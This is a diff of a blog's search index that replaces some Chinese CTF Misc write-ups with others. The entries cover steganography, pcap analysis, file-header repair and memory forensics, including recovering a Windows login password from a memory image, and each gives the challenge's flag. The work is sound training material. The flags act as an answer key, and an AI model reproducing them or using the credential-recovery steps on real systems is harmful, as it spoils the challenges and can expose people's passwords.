@@ -4,32 +4,11 @@
   
     
     <entry>
-      <title>[HDCTF 2023]hardMisc</title>
-      <link href="/2023/09/01/%5BHDCTF%202023%5DhardMisc/"/>
-      <url>/2023/09/01/%5BHDCTF%202023%5DhardMisc/</url>
+      <title>[NISACTF 2022]流量包里有个熊</title>
+      <link href="/2023/09/02/%5BNISACTF%202022%5D%E6%B5%81%E9%87%8F%E5%8C%85%E9%87%8C%E6%9C%89%E4%B8%AA%E7%86%8A/"/>
+      <url>/2023/09/02/%5BNISACTF%202022%5D%E6%B5%81%E9%87%8F%E5%8C%85%E9%87%8C%E6%9C%89%E4%B8%AA%E7%86%8A/</url>
       
-        <content type="html"><![CDATA[<p> 打开压缩包，是个图片</p><p><img src="https://imag.keyblue.cn/imag/202308301218216.png" alt="image-20230830121850165"></p><p>直接拉到kali分离</p><p><img src="https://imag.keyblue.cn/imag/202308301219218.png" alt="image-20230830121950171"></p><p>没有东西，随机使用010打开</p><p><img src="https://imag.keyblue.cn/imag/202308301220202.png" alt="image-20230830122057163"></p><p>内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ==</span><br></pre></td></tr></table></figure><p>解码就是flag：HDCTF{wE1c0w3_10_HDctf_M15c}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[HUBUCTF 2022 新生赛]最简单的misc</title>
-      <link href="/2023/09/01/%5BHUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc/"/>
-      <url>/2023/09/01/%5BHUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc/</url>
-      
-        <content type="html"><![CDATA[<p>打开文件是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308311029117.png" alt="image-20230831102912950"></p><p>直接用010打开图片，没有发现</p><p>把文件拉到kali进行分离，没有发现</p><p>zsteg测试，发现lsb隐写</p><p><img src="https://imag.keyblue.cn/imag/202308311042725.png" alt="image-20230831104259676"></p><p>直接使用命令提取</p><p><img src="https://imag.keyblue.cn/imag/202308311046549.png" alt="image-20230831104659519"></p><p>打开1.png发现是个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308311047211.png" alt="image-20230831104731175"></p><p>使用CaptfEncoder解码</p><p><img src="https://imag.keyblue.cn/imag/202308311048413.png" alt="image-20230831104856358"></p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<p>拿到文件后发现没有后缀，先拉到kali分析</p><p><img src="https://imag.keyblue.cn/imag/202309021611129.png" alt="image-20230902161138093"></p><p>鉴定为pcap文件，随即增加后缀名</p><p>wireshark打开流量包分析，发现有少量HTTP请求</p><p><img src="https://imag.keyblue.cn/imag/202309021618712.png" alt="image-20230902161835678"></p><p>导出被访问的图片</p><p><img src="https://imag.keyblue.cn/imag/202309021619756.png" alt="image-20230902161918732"></p><p>是一头熊，也算是符合题意了，估计flag就在它身上</p><p><img src="https://imag.keyblue.cn/imag/202309021620311.png" alt="image-20230902162019277"></p><p>binwalk分析图片，发现还隐藏着一个RAR压缩包</p><p><img src="https://imag.keyblue.cn/imag/202309021622207.png" alt="image-20230902162210173"></p><p>使用<code>binwalk CuteBear.jpg -e</code>分离压缩包</p><p>压缩包里还有一个小熊图片和两个flag</p><p>对其中一个flag文件进行BASE64解码，这是假的flag</p><p><img src="https://imag.keyblue.cn/imag/202309021627878.png" alt="image-20230902162722845"></p><p>打开另一个文本，没有发现什么，似乎是一段密文，先放着，等会在看</p><p><img src="https://imag.keyblue.cn/imag/202309021702434.png" alt="image-20230902170250395"></p><p>我们把压缩包里的图片再次分离，发现和上一层有点不一样</p><p><img src="https://imag.keyblue.cn/imag/202309021704657.png" alt="image-20230902170405633"></p><p><img src="https://imag.keyblue.cn/imag/202309021704760.png" alt="image-20230902170439740"></p><p>两个个flag.txt和上一层都是一样的，唯一变的是文件夹的名称，文件夹名称变为13，结合那段密文尝试解密，猜测有可能是ROT13加密，随即解密</p><p><img src="https://imag.keyblue.cn/imag/202309021707825.png" alt="image-20230902170716795"></p><p>成功解密，明文开头为FFD8，是JPEG文件没错了，010新建并写入保存为JPG文件</p><p><img src="https://imag.keyblue.cn/imag/202309021709996.png" alt="image-20230902170922965"></p><p>这是原图</p><p><img src="https://imag.keyblue.cn/imag/202309021709673.jpg" alt="Untitled2"></p><p>在此图片上没有发现其他隐藏信息，所以应该是盲水印</p><p>这里使用吾爱破解论坛发布的WaterMark进行查看水印</p><p>这里附工具的下载方式：<a href="https://www.jb51.net/softs/635870.html#downintro2">工具下载</a></p><p><img src="https://imag.keyblue.cn/imag/202309021829796.png" alt="image-20230902182929697"></p><p>图片非常模糊，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S0_clev2l_You</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -46,11 +25,11 @@
     
     
     <entry>
-      <title>[LitCTF 2023]404notfound (初级)</title>
-      <link href="/2023/09/01/%5BLitCTF%202023%5D404notfound%20(%E5%88%9D%E7%BA%A7)/"/>
-      <url>/2023/09/01/%5BLitCTF%202023%5D404notfound%20(%E5%88%9D%E7%BA%A7)/</url>
+      <title>[SWPUCTF 2021 新生赛]zipbomb</title>
+      <link href="/2023/09/02/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dzipbomb/"/>
+      <url>/2023/09/02/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dzipbomb/</url>
       
-        <content type="html"><![CDATA[<p>解压之后是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308281011008.png" alt="image-20230828101118969"></p><p>binwalk分离无果</p><p>用010打开图片，拉到最后，没有发现有用的信息</p><p>在kali里使用strings命令查看</p><p><img src="https://imag.keyblue.cn/imag/202308281022205.png" alt="image-20230828102243162"></p><p>发现flag值：LitCTF{Its_404_but_1ts_n0t_a_page}</p>]]></content>
+        <content type="html"><![CDATA[<p>题目说不要解压压缩包</p><p>我们用7z打开压缩包查看，没有发现</p><p><img src="https://imag.keyblue.cn/imag/202309021600258.png" alt="image-20230902160017196"></p><p>使用binwalk分析文件，发现还有一个压缩包</p><p><img src="https://imag.keyblue.cn/imag/202309021604707.png" alt="image-20230902160430677"></p><p>随即，binwalk分离文件需要手动暂停，不然会把所有文件对分离出来</p><p><img src="https://imag.keyblue.cn/imag/202309021606526.png" alt="image-20230902160636502"></p><p><img src="https://imag.keyblue.cn/imag/202309021606351.png" alt="image-20230902160648311"></p><p>也可使用foremost分离，无需手动暂停</p><p><img src="https://imag.keyblue.cn/imag/202309021607443.png" alt="image-20230902160728420"></p><p>打开第二个压缩包即是flah文件</p><p><img src="https://imag.keyblue.cn/imag/202309021608078.png" alt="image-20230902160832034"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;Z1p_B00m_d1sp0sal&#125;</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -67,11 +46,11 @@
     
     
     <entry>
-      <title>[LitCTF 2023]破损的图片(初级)</title>
-      <link href="/2023/09/01/%5BLitCTF%202023%5D%E7%A0%B4%E6%8D%9F%E7%9A%84%E5%9B%BE%E7%89%87(%E5%88%9D%E7%BA%A7)/"/>
-      <url>/2023/09/01/%5BLitCTF%202023%5D%E7%A0%B4%E6%8D%9F%E7%9A%84%E5%9B%BE%E7%89%87(%E5%88%9D%E7%BA%A7)/</url>
+      <title>[蓝帽杯 2022 初赛]计算机取证</title>
+      <link href="/2023/09/02/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
+      <url>/2023/09/02/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/</url>
       
-        <content type="html"><![CDATA[<p>打开压缩包，里面是一个没有后缀名的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311304019.png" alt="image-20230831130438973"></p><p>用010打开，发现文件头缺失了</p><p><img src="https://imag.keyblue.cn/imag/202308311306601.png" alt="image-20230831130655578"></p><p>修复文件头</p><p><img src="https://imag.keyblue.cn/imag/202308311311610.png" alt="image-20230831131123578"></p><p>成功打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311311413.png" alt="image-20230831131146253"></p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;May you, the beauty of this world, always shine.&#125;</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现对一个windows计算机进行取证，请您对以下问题进行分析解答。</span><br></pre></td></tr></table></figure><h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从内存镜像中获得taqi7的开机密码是多少？</span><br></pre></td></tr></table></figure><p><img src="https://imag.keyblue.cn/imag/202309011513162.png" alt="image-20230901151036671"></p><p>密文：<code>7f21caca5685f10d9e849cc84c340528</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anxinqi</span><br></pre></td></tr></table></figure><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">制作该内存镜像的进程Pid号是多少？</span><br></pre></td></tr></table></figure><p>MagnetRAMCaptu是制作镜像制作工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.dmp --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://imag.keyblue.cn/imag/202309021419123.png" alt="image-20230902141951071"></p><p>所以进程号是2192</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2192</span><br></pre></td></tr></table></figure><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitlokcer分区某office文件中存在的flag值为？（答案参考格式：NSSCTF&#123;abcABC123&#125;）</span><br></pre></td></tr></table></figure><p>Bitlocker是windows系统的加密分区</p>]]></content>
       
       
       <categories>
@@ -109,368 +88,11 @@
     
     
     <entry>
-      <title>[LitCTF 2023]Take me hand (初级)</title>
-      <link href="/2023/09/01/%5BLitCTF%202023%5DTake%20me%20hand%20(%E5%88%9D%E7%BA%A7)/"/>
-      <url>/2023/09/01/%5BLitCTF%202023%5DTake%20me%20hand%20(%E5%88%9D%E7%BA%A7)/</url>
-      
-        <content type="html"><![CDATA[<p>打开流量包过滤http</p><p><img src="https://imag.keyblue.cn/imag/202308291318257.png" alt="image-20230829131841214"></p><p>点开其中一个请求包可以看到请求内容就是flag</p><p><img src="https://imag.keyblue.cn/imag/202308291319812.png" alt="image-20230829131929775"></p><p>LitCTF{Give_y0ur_hand_to_me!!!_plz}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[NISACTF 2022]bqt</title>
-      <link href="/2023/09/01/%5BNISACTF%202022%5Dbqt/"/>
-      <url>/2023/09/01/%5BNISACTF%202022%5Dbqt/</url>
-      
-        <content type="html"><![CDATA[<p>先拉到kali里查看文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308281614423.png" alt="image-20230828161452394"></p><p>是一个pdf文件</p><p>binwalk分离无果</p><p>使用010打开文件，没有发现有用的信息</p><p>最后打开pdf文件查看，使用ctrl+A全选，发现文档中间有内容，复制查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd</span><br></pre></td></tr></table></figure><p>每间隔两个字符加个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c8 e9 ac a0 c3 f4 e6 e5 f2 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 e6 ec e1 e7 fb f7 e5 e6 e5 ef e9 e4 ea e7 ef e5 e4 f3 e6 e9 ef f2 f0 e5 e6 e4 e6 e7 e7 e6 e4 f3 e5 fd</span><br></pre></td></tr></table></figure><p>转换成10进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200 233 172 160 195 244 230 229 242 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 230 236 225 231 251 247 229 230 229 239 233 228 234 231 239 229 228 243 230 233 239 242 240 229 230 228 230 231 231 230 228 243 229 253</span><br></pre></td></tr></table></figure><p>因为flag一般最后一个字符是}</p><p>}字符的ASCII码序号是125</p><p>253-125&#x3D;128，可以每个字符减128试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72 105 44 32 67 116 102 101 114 33 32 84 104 101 32 102 108 97 103 32 105 115 58 32 102 108 97 103 123 119 101 102 101 111 105 100 106 103 111 101 100 115 102 105 111 114 112 101 102 100 102 103 103 102 100 115 101 125</span><br></pre></td></tr></table></figure><p>ascll解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi, Ctfer! The flag is: flag&#123;wefeoidjgoedsfiorpefdfggfdse&#125;</span><br></pre></td></tr></table></figure><p>恶心~</p><p>一般flag都是用}结尾的  }的ascii十进制值为125</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[LitCTF 2023]这羽毛球怎么只有一半啊（恼 (初级)</title>
-      <link href="/2023/09/01/%5BLitCTF%202023%5D%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%EF%BC%88%E6%81%BC%20(%E5%88%9D%E7%BA%A7)/"/>
-      <url>/2023/09/01/%5BLitCTF%202023%5D%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%EF%BC%88%E6%81%BC%20(%E5%88%9D%E7%BA%A7)/</url>
-      
-        <content type="html"><![CDATA[<p>图片只有一半</p><p><img src="https://imag.keyblue.cn/imag/202308281057421.png" alt="image-20230828105727274"></p><p>应该是要爆破图片宽高</p><p>010直接更改图片高度，保存打开图片可以看到完整图片了</p><p><img src="https://imag.keyblue.cn/imag/202308281152722.png" alt="image-20230828115241690"></p><p><img src="https://imag.keyblue.cn/imag/202308281154576.png" alt="image-20230828115419501"></p><p><img src="https://imag.keyblue.cn/imag/202308281154939.png" alt="image-20230828115441917"></p><p>LitCTF{Fl4g_0fcourse!}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2019]Network</title>
-      <link href="/2023/09/01/%5BSWPU%202019%5DNetwork/"/>
-      <url>/2023/09/01/%5BSWPU%202019%5DNetwork/</url>
-      
-        <content type="html"><![CDATA[<p>TTL隐写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。</span><br><span class="line">TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，</span><br><span class="line">远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</span><br><span class="line">如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</span><br></pre></td></tr></table></figure><p>根据上述规则，可以知道TTL隐写中用到四个值：<code>00 111111</code>（63）,<code>01 111111</code>（127）,<code>10 111111</code>（191）,<code>11 111111</code>（255）,解密的时候只取前两位，然后转换成ascii<br> 简化一下，可以这么认为：<br> 用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 替换 63</span><br><span class="line">01 替换 127</span><br><span class="line">10 替换 191</span><br><span class="line">11 替换 255</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data_bin = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res/attachment-2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">63</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">127</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">191</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">255</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;11&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data_bin)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bin), <span class="number">8</span>):</span><br><span class="line">    data += <span class="built_in">chr</span>(<span class="built_in">int</span>(data_bin[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">res = binascii.unhexlify(data)</span><br><span class="line">f2.write(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开脚本输出的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311501267.png" alt="image-20230831150148240"></p><p>很明显这是一个zip压缩包</p><p>我们改后缀为zip打开，发现了flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308311502949.png" alt="image-20230831150252916"></p><p>base64解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res/flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    data = f.read().encode()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>得到的flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[NISACTF 2022]huaji</title>
-      <link href="/2023/09/01/%5BNISACTF%202022%5Dhuaji/"/>
-      <url>/2023/09/01/%5BNISACTF%202022%5Dhuaji/</url>
-      
-        <content type="html"><![CDATA[<p>使用binwalk进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308271206557.png" alt="image-20230827120618515"></p><p>得到的压缩包需要密码解压</p><p><img src="https://imag.keyblue.cn/imag/202308271208655.png" alt="image-20230827120802621"></p><p>找不到密码，在原图片上看看，发现huaji？的属性里有一串奇怪的字符<code>6374665f4e4953415f32303232</code></p><p><img src="https://imag.keyblue.cn/imag/202308271216203.png" alt="image-20230827121638167"></p><p>对其进行ascll解码得到<code>ctf_NISA_2022</code></p><p><img src="https://imag.keyblue.cn/imag/202308271218072.png" alt="image-20230827121857045"></p><p>使用解码字符对压缩包解压缩，得到flag值<code>flag&#123;Nls@_FumYEnnOjy&#125;</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[NISACTF 2022]为什么我什么都看不见</title>
-      <link href="/2023/09/01/%5BNISACTF%202022%5D%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%80%E4%B9%88%E9%83%BD%E7%9C%8B%E4%B8%8D%E8%A7%81/"/>
-      <url>/2023/09/01/%5BNISACTF%202022%5D%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%80%E4%B9%88%E9%83%BD%E7%9C%8B%E4%B8%8D%E8%A7%81/</url>
-      
-        <content type="html"><![CDATA[<p>使用010打开文件，破损的PNG文件头，补好</p><p><img src="https://imag.keyblue.cn/imag/202308271735376.png" alt="image-20230827173547339"></p><p>然后给文件加上后缀</p><p>在kali使用zsteg查看隐写</p><p><img src="https://imag.keyblue.cn/imag/202308271737376.png" alt="image-20230827173729331"></p><p>得到flag值NISA{Wlec0me_to_NiSa2022}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2019]伟大的侦探</title>
-      <link href="/2023/09/01/%5BSWPU%202019%5D%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/"/>
-      <url>/2023/09/01/%5BSWPU%202019%5D%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/</url>
-      
-        <content type="html"><![CDATA[<p>打开压缩包有一个文件夹和一个txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308301859149.png" alt="image-20230830185950098"></p><p>文件夹杯加密了，我们打开<code>密码.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308301900883.png" alt="image-20230830190032862"></p><p>是两串乱码</p><p>用010打开<code>密码.txt</code>，切换字符集为EBCDIC</p><p><img src="https://imag.keyblue.cn/imag/202308301908474.png" alt="image-20230830190823454"></p><p>得到了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm_is_the_best_team!</span><br></pre></td></tr></table></figure><p>使用这个字符串解压剩下的内容</p><p>是一堆跳舞的小人</p><p><img src="https://imag.keyblue.cn/imag/202308301912749.png" alt="image-20230830191249707"></p><p>解码图</p><p><img src="https://imag.keyblue.cn/imag/202308301934989.jpg" alt="跳舞的小人对应表"></p><p>解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iloveholmesandwllm</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2019]漂流记的马里奥</title>
-      <link href="/2023/09/01/%5BSWPU%202019%5D%E6%BC%82%E6%B5%81%E8%AE%B0%E7%9A%84%E9%A9%AC%E9%87%8C%E5%A5%A5/"/>
-      <url>/2023/09/01/%5BSWPU%202019%5D%E6%BC%82%E6%B5%81%E8%AE%B0%E7%9A%84%E9%A9%AC%E9%87%8C%E5%A5%A5/</url>
-      
-        <content type="html"><![CDATA[<p>题目给的是一个exe文件，双击运行会创建1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271956089.png" alt="image-20230827195658049"></p><p><img src="https://imag.keyblue.cn/imag/202308271957280.png" alt="image-20230827195710245"></p><p>使用010打开文件，发现末尾是个rar压缩包以及ntfs和flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271959190.png" alt="image-20230827195901155"></p><p>在cmd中使用<code>dir /r</code>命令可以发现<code> 1.txt:flag.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308272104590.png" alt="image-20230827210410554"></p><p>最后使用<code>notepad 1.txt:flag.txt</code>可以查看隐藏的内容</p><p><img src="https://imag.keyblue.cn/imag/202308272105464.png" alt="image-20230827210502434"></p><p>得到flag值swupctf{ddg_is_cute}</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2019]神奇的二维码</title>
-      <link href="/2023/09/01/%5BSWPU%202019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
-      <url>/2023/09/01/%5BSWPU%202019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
-      
-        <content type="html"><![CDATA[<p>使用<code>foremost -i MISC-神奇的二维码-BitcoinPay.png</code>未分离出内容</p><p><img src="https://imag.keyblue.cn/imag/202308271014365.png" alt="foremost分离"></p><p>使用<code>binwalk -e *.png --run-as=root</code>分离出多个rar压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308271016763.png" alt="image-20230827101620731"></p><p><img src="https://imag.keyblue.cn/imag/202308271019800.png" alt="image-20230827101958767"></p><ul><li><p>解密<code>flag.doc</code>中的内容，得到<code>comEON_YOuAreSOSoS0great</code>，据测试是<code>18394.rar</code>的密码，解开压缩包得到<code>good.mp3</code></p></li><li><p>解密<code>encode.txt</code>中的内容得到<code>asdfghjkl1234567890</code>，据测试是<code>看看flag在不在里面^_^.rar</code> 的密码，解开压缩包得到<code>flag.jpg</code></p></li></ul><p>使用<code>Audacity64.exe</code>打开<code>good.mp3</code>发现是莫斯电码，记录得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</span><br><span class="line"></span><br><span class="line">解码后：morseisveryveryeasy</span><br></pre></td></tr></table></figure><p>提交flag</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WriteUp </category>
-          
-          <category> Misc </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[SWPU 2020]套娃</title>
-      <link href="/2023/09/01/%5BSWPU%202020%5D%E5%A5%97%E5%A8%83/"/>
